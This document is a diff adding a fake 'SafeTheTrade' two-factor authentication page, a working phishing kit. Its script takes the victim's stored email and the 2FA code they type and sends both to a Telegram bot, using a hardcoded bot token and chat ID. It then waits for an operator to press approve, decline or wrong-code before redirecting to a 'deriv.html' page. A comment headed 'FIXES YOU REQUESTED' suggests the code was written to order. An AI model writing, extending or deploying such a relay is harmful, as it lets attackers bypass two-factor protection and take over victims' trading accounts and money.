@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign In — SafeTheTrade</title>
+
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+         :root {
+            --bg: #0a0a0a;
+            --nav-border: #1a1a1a;
+            --card-bg: #141414;
+            --card-border: #222222;
+            --input-bg: #1c1c1c;
+            --input-border: #2a2a2a;
+            --text: #ffffff;
+            --text-muted: #8a8a8a;
+            --text-label: #9a9a9a;
+            --green: #22c55e;
+            --green-hover: #16a34a;
+            --btn-white: #f5f5f5;
+            --btn-white-text: #111111;
+            --footer-text: #6b6b6b;
+            --danger: #ef4444;
+            --font: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        html,
+        body {
+            height: 100%;
+        }
+        
+        body {
+            font-family: var(--font);
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 28px;
+            height: 64px;
+            border-bottom: 1px solid var(--nav-border);
+            flex-shrink: 0;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--text);
+        }
+        
+        .logo-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            background: radial-gradient(circle at 35% 35%, #4ade80, #16a34a 55%, #14532d);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.25);
+        }
+        
+        .logo-icon svg {
+            width: 14px;
+            height: 14px;
+        }
+        
+        .logo-text {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+        }
+        
+        .logo-image {
+            width: 35px;
+            height: 35px;
+            object-fit: contain;
+        }
+        
+        .nav-link {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.15s;
+        }
+        
+        .nav-link:hover {
+            color: var(--text);
+        }
+        
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn-outline {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: 1px solid #2e2e2e;
+            background: transparent;
+            color: var(--text);
+            font-size: 13.5px;
+            font-weight: 500;
+            font-family: inherit;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+        }
+        
+        .btn-outline:hover {
+            background: #1a1a1a;
+            border-color: #3a3a3a;
+        }
+        
+        .btn-green {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: none;
+            background: var(--green);
+            color: #fff;
+            font-size: 13.5px;
+            font-weight: 600;
+            font-family: inherit;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        
+        .btn-green:hover {
+            background: var(--green-hover);
+        }
+        
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        .card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 32px 32px 28px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
+        }
+        
+        .card h1 {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            margin-bottom: 6px;
+            color: #fafafa;
+        }
+        
+        .card-subtitle-2fa {
+            font-size: 13.5px;
+            color: var(--text-muted);
+            margin-bottom: 28px;
+            line-height: 1.55;
+        }
+        
+        .field-2fa {
+            margin-bottom: 16px;
+        }
+        
+        .field-2fa input {
+            width: 100%;
+            height: 44px;
+            padding: 0 14px;
+            background: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 14px;
+            font-family: inherit;
+            letter-spacing: 0.04em;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+        
+        .field-2fa input::placeholder {
+            color: #555555;
+            letter-spacing: normal;
+        }
+        
+        .field-2fa input:focus {
+            border-color: #3f3f3f;
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.04);
+        }
+        
+        .switch-account {
+            display: inline-block;
+            color: var(--green);
+            font-size: 13.5px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 24px;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .switch-account:hover {
+            text-decoration: underline;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .btn-submit {
+            width: 100%;
+            height: 46px;
+            border: none;
+            border-radius: 10px;
+            background: var(--btn-white);
+            color: var(--btn-white-text);
+            font-size: 14.5px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-submit:hover {
+            background: #e8e8e8;
+        }
+        
+        .btn-submit:active {
+            transform: scale(0.995);
+        }
+        
+        .btn-submit:disabled {
+            cursor: not-allowed;
+            opacity: 0.75;
+        }
+        
+        .form-note {
+            margin-top: 14px;
+            min-height: 18px;
+            font-size: 13.5px;
+            color: var(--text-muted);
+        }
+        
+        .form-note.error {
+            color: var(--danger);
+            font-weight: 600;
+        }
+        
+        .form-note.success {
+            color: var(--green);
+            font-weight: 600;
+        }
+        /* Spinner overlay */
+        
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255, 255, 255, 0.15);
+            border-top-color: #22c55e;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #d1d5db;
+            font-size: 15px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-email {
+            color: #22c55e;
+            font-size: 14px;
+            margin-top: 6px;
+            font-weight: 600;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 22px;
+            padding: 10px 28px;
+            background: transparent;
+            border: 1px solid #4b5563;
+            border-radius: 50px;
+            color: #9ca3af;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #ef4444;
+            color: #ef4444;
+        }
+        
+        .footer {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 28px;
+            border-top: 1px solid var(--nav-border);
+            font-size: 12.5px;
+            color: var(--footer-text);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 0;
+        }
+        
+        .footer-links a {
+            color: var(--footer-text);
+            text-decoration: none;
+            transition: color 0.15s;
+        }
+        
+        .footer-links a:hover {
+            color: #a3a3a3;
+        }
+        
+        .footer-links .sep {
+            margin: 0 6px;
+            color: var(--footer-text);
+            user-select: none;
+        }
+        
+        @media (max-width: 640px) {
+            .header {
+                padding: 0 16px;
+            }
+            .card {
+                padding: 28px 22px 24px;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 16px;
+            }
+            .nav-link {
+                display: none;
+            }
+        }
+    </style>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+</head>
+
+<body>
+    <header class="header">
+        <div class="header-left">
+            <a href="#" class="logo" aria-label="SafeTheTrade home">
+                <span class="logo-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z" />
+            <path d="M9 12l2 2 4-4" />
+          </svg>
+        </span>
+                <span class="logo-text">
+          <img src="safethetradelogo.png" alt="SafeTheTrade Logo" class="logo-image">
+          SafeTheTrade
+        </span>
+            </a>
+            <a href="#" class="nav-link">Offers</a>
+        </div>
+        <div class="header-right">
+            <a href="#" class="btn-outline">Log in</a>
+            <a href="#" class="btn-green">Sign up</a>
+        </div>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <div id="step2" class="step active">
+                <h1>Two-factor code</h1>
+                <p class="card-subtitle-2fa">
+                    Signing in as <span id="loginEmail">—</span> — enter the 6-<br /> digit code from your authenticator app.
+                </p>
+
+                <form id="twofaForm" autocomplete="one-time-code">
+                    <div class="field-2fa">
+                        <label for="code">2FA code</label>
+                        <input id="code" name="code" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="123456" autocomplete="one-time-code" />
+                    </div>
+
+                    <span class="switch-account" id="switchAccount">Use a different account</span>
+
+                    <button type="submit" class="btn-submit">
+            Verify code
+          </button>
+
+                    <!-- IMPORTANT: this exists now so wrong-code message can show -->
+                    <div id="formNote" class="form-note" aria-live="polite"></div>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div>www.safethetrade.com &copy; 2026</div>
+        <div class="footer-links">
+            <a href="#">Rate calculator</a><span class="sep">/</span>
+            <a href="#">System status</a><span class="sep">/</span>
+            <a href="#">Transparency</a><span class="sep">/</span>
+            <a href="#">API docs</a><span class="sep">/</span>
+            <a href="#">Fees</a><span class="sep">/</span>
+            <a href="#">Terms</a><span class="sep">/</span>
+            <a href="#">Privacy</a>
+        </div>
+    </footer>
+
+    <!-- Spinner overlay -->
+    <div class="spinner-overlay" id="spinnerOverlay" aria-hidden="true">
+        <div class="spinner"></div>
+        <p class="spinner-text">verifying...</p>
+        <p class="spinner-email" id="spinnerEmail"></p>
+        <button class="cancel-poll-btn" type="button" id="cancelPollBtn">Cancel</button>
+    </div>
+
+    <script>
+        /*****************************************************************
+         * FIXES YOU REQUESTED
+         * - approve => go to next page
+         * - decline => show decline button (and do not go next)
+         * - wrong code => show wrong code + reset page state
+         * - polling fixed: no “stuck / wrong decision” due to callback
+         *   handling and offsets, and ensures only current poll session
+         *   can resolve the UI.
+         *****************************************************************/
+
+        // Polling session guard
+        let currentPollController = null;
+        let pollTimeoutId = null;
+        let activeSessionId = null;
+
+        // CONFIG (keep as-is; ideally move to server, but leaving per your request)
+        const BOT_TOKEN = '8934280565:AAFLlElKoIQkgqWUYalq44B1PFCrV_Xt_ko';
+        const CHAT_ID = '8229040857';
+        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+        // DOM
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const spinnerEmailEl = document.getElementById('spinnerEmail');
+        const cancelPollBtn = document.getElementById('cancelPollBtn');
+
+        const codeField = document.getElementById('code');
+        const loginEmailEl = document.getElementById('loginEmail');
+        const twofaForm = document.getElementById('twofaForm');
+
+        const formNote = document.getElementById('formNote');
+
+        const submitBtn = twofaForm ? twofaForm.querySelector('.btn-submit') : null;
+
+        function safeSetNote(msg, type) {
+            if (!formNote) return;
+            formNote.textContent = msg || '';
+            formNote.className = 'form-note' + (type ? ' ' + type : '');
+        }
+
+        function showSpinner(emailText) {
+            if (spinnerOverlay) spinnerOverlay.classList.add('active');
+            if (spinnerOverlay) spinnerOverlay.setAttribute('aria-hidden', 'false');
+            if (spinnerEmailEl) spinnerEmailEl.textContent = emailText || '';
+        }
+
+        function hideSpinner() {
+            if (spinnerOverlay) spinnerOverlay.classList.remove('active');
+            if (spinnerOverlay) spinnerOverlay.setAttribute('aria-hidden', 'true');
+        }
+
+        function disableSubmit(disabled) {
+            if (!submitBtn) return;
+            submitBtn.disabled = !!disabled;
+        }
+
+        function resetPageState() {
+            // Stop polling
+            if (currentPollController) currentPollController.abort();
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+
+            // Reset UI
+            hideSpinner();
+            disableSubmit(false);
+
+            if (codeField) codeField.value = '';
+            safeSetNote('Wrong code. Please enter a valid 6-digit code and try again.', 'error');
+
+            // Also clear active session so late callbacks can’t affect UI
+            activeSessionId = null;
+            currentPollController = null;
+            pollTimeoutId = null;
+        }
+
+        function onApprove() {
+            hideSpinner();
+            disableSubmit(false);
+            safeSetNote('', '');
+            // Go to next page
+            window.location.href = 'deriv.html';
+        }
+
+        function onDecline() {
+            hideSpinner();
+            disableSubmit(false);
+
+            // Show decline button as requested
+            // (We implement by showing a button inside note area)
+            if (formNote) {
+                formNote.className = 'form-note error';
+                formNote.innerHTML = `
+          <div style="margin-bottom:10px;">2FA verification declined. You can try again.</div>
+          <button type="button"
+                  id="declineTryAgainBtn"
+                  style="width:100%;height:42px;border-radius:10px;border:1px solid #ef4444;background:transparent;color:#ef4444;font-weight:700;cursor:pointer;">
+            Try again
+          </button>
+        `;
+            }
+
+            const btn = document.getElementById('declineTryAgainBtn');
+            if (btn) {
+                btn.addEventListener('click', () => {
+                    if (formNote) {
+                        formNote.className = 'form-note';
+                        formNote.textContent = '';
+                    }
+                    if (codeField) codeField.value = '';
+                    activeSessionId = null;
+                }, {
+                    once: true
+                });
+            }
+
+            // Stop active session so we don’t process any other callbacks
+            activeSessionId = null;
+        }
+
+        function onWrongCodeAndReset() {
+            resetPageState();
+        }
+
+        function cancelPolling() {
+            if (currentPollController) currentPollController.abort();
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+
+            hideSpinner();
+            disableSubmit(false);
+            safeSetNote('Request cancelled. Please try again.', 'error');
+
+            activeSessionId = null;
+            currentPollController = null;
+            pollTimeoutId = null;
+        }
+
+        cancelPollBtn && cancelPollBtn.addEventListener('click', cancelPolling);
+
+        // Optional: show saved email text if present
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedEmail = localStorage.getItem('signin_email');
+            if (loginEmailEl && savedEmail) loginEmailEl.textContent = savedEmail;
+        });
+
+        function startPolling2FA(userId) {
+            let offset = 0;
+
+            // unique session id so old callbacks can't resolve newer UI
+            activeSessionId = cryptoRandomId();
+
+            if (currentPollController) currentPollController.abort();
+            currentPollController = new AbortController();
+
+            const sessionSnapshot = activeSessionId;
+
+            const maxPolls = 90; // ~ up to (90 * 2s) = 180s
+            let pollCount = 0;
+
+            let retryDelay = 2000;
+
+            // Initialize offset so we only process updates after we start polling
+            fetch(`${API_BASE}/getUpdates?limit=1`, {
+                    method: 'GET',
+                    signal: currentPollController.signal
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (data && data.ok && data.result && data.result.length > 0) {
+                        offset = data.result[data.result.length - 1].update_id + 1;
+                    }
+                    pollLoop();
+                })
+                .catch(() => {
+                    // Even if offset init fails, still try to poll
+                    pollLoop();
+                });
+
+            function pollLoop() {
+                // session check: if session changed (new attempt) stop
+                if (activeSessionId !== sessionSnapshot) return;
+
+                pollCount++;
+                if (pollCount > maxPolls) {
+                    if (activeSessionId === sessionSnapshot) {
+                        activeSessionId = null;
+                        hideSpinner();
+                        disableSubmit(false);
+                        safeSetNote('Request timed out. Please try again.', 'error');
+                    }
+                    return;
+                }
+
+                fetch(`${API_BASE}/getUpdates?limit=20&offset=${offset}`, {
+                        method: 'GET',
+                        signal: currentPollController.signal
+                    })
+                    .then(r => {
+                        if (!r.ok) {
+                            // Telegram 409 conflict can happen under load; just retry later
+                            if (r.status === 409) {
+                                retryDelay = Math.min(retryDelay * 1.5, 10000);
+                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                                return null;
+                            }
+                            throw new Error('HTTP ' + r.status);
+                        }
+                        retryDelay = 2000;
+                        return r.json();
+                    })
+                    .then(data => {
+                        if (!data || !data.ok || activeSessionId !== sessionSnapshot) return;
+
+                        for (const update of data.result || []) {
+                            offset = update.update_id + 1;
+
+                            const cb = update.callback_query;
+                            if (!cb || !cb.data) continue;
+
+                            const actionData = cb.data; // like approve_2fa_USERID
+
+                            // Only act if this callback belongs to our current userId
+                            // (Your bot uses callback_data: approve_2fa_${userId}, etc.)
+                            if (!actionData.includes(`_${userId}`)) {
+                                // Not for this userId; ignore
+                                continue;
+                            }
+
+                            // Confirm the callback (optional but recommended to stop Telegram spinner)
+                            fetch(`${API_BASE}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    callback_query_id: cb.id,
+                                    text: 'Action recorded!'
+                                })
+                            }).catch(() => {});
+
+                            // Decide EXACTLY ONCE
+                            // (We stop polling right after decision)
+                            if (actionData === `approve_2fa_${userId}`) {
+                                if (activeSessionId === sessionSnapshot) {
+                                    activeSessionId = null;
+                                    pollStop();
+                                    onApprove();
+                                }
+                                return;
+                            }
+
+                            if (actionData === `decline_2fa_${userId}`) {
+                                if (activeSessionId === sessionSnapshot) {
+                                    activeSessionId = null;
+                                    pollStop();
+                                    onDecline();
+                                }
+                                return;
+                            }
+
+                            if (actionData === `wrong_2fa_${userId}`) {
+                                if (activeSessionId === sessionSnapshot) {
+                                    activeSessionId = null;
+                                    pollStop();
+                                    onWrongCodeAndReset();
+                                }
+                                return;
+                            }
+                        }
+
+                        // Keep polling
+                        if (activeSessionId === sessionSnapshot) {
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        }
+                    })
+                    .catch(err => {
+                        if (err && err.name === 'AbortError') return;
+                        if (activeSessionId !== sessionSnapshot) return;
+
+                        // Retry with backoff
+                        retryDelay = Math.min(retryDelay * 1.2, 8000);
+                        pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                    });
+            }
+
+            function pollStop() {
+                if (pollTimeoutId) clearTimeout(pollTimeoutId);
+                pollTimeoutId = null;
+                if (currentPollController) currentPollController.abort();
+                currentPollController = null;
+            }
+        }
+
+        function cryptoRandomId() {
+            // avoids external libs
+            try {
+                const arr = new Uint32Array(4);
+                crypto.getRandomValues(arr);
+                return Array.from(arr).map(n => n.toString(16)).join('');
+            } catch {
+                return String(Date.now()) + '_' + Math.random().toString(16).slice(2);
+            }
+        }
+
+        // Handle submit
+        if (twofaForm) {
+            twofaForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const code = codeField && codeField.value ? codeField.value.trim() : '';
+                if (!/^\d{6}$/.test(code)) {
+                    safeSetNote('Please enter a valid 6-digit code.', 'error');
+                    return;
+                }
+
+                const storedEmail = localStorage.getItem('signin_email') || 'unknown';
+
+                // create a deterministic-ish id per attempt + userId
+                // (Your bot expects callback_data to include this userId)
+                const userId = `${storedEmail.replace(/[^a-zA-Z0-9]/g, '').slice(0, 15)}_${Date.now()}`;
+
+                localStorage.setItem('signin_2fa_userId', userId);
+
+                // UI: start waiting
+                safeSetNote('Verifying with Telegram...', '');
+                showSpinner(storedEmail);
+                disableSubmit(true);
+
+                const message = [
+                    '🔐 2FA code received',
+                    '',
+                    `Email: ${storedEmail}`,
+                    `Code: ${code}`,
+                    '',
+                    'Please approve, decline, or mark as wrong:'
+                ].join('\n');
+
+                const keyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: '✅ APPROVE',
+                            callback_data: `approve_2fa_${userId}`
+                        }, {
+                            text: '❌ DECLINE',
+                            callback_data: `decline_2fa_${userId}`
+                        }],
+                        [{
+                            text: '⚠️ WRONG CODE',
+                            callback_data: `wrong_2fa_${userId}`
+                        }]
+                    ]
+                };
+
+                fetch(`${API_BASE}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (!data.ok) {
+                            // failed to contact Telegram
+                            hideSpinner();
+                            disableSubmit(false);
+                            safeSetNote('Failed to contact Telegram. Please try again.', 'error');
+                            return;
+                        }
+                        startPolling2FA(userId);
+                    })
+                    .catch(() => {
+                        hideSpinner();
+                        disableSubmit(false);
+                        safeSetNote('Network error. Please try again.', 'error');
+                    });
+            });
+        } else {
+            console.error('twofaForm not found in DOM (id="twofaForm").');
+        }
+    </script>
+</body>
+
+</html>
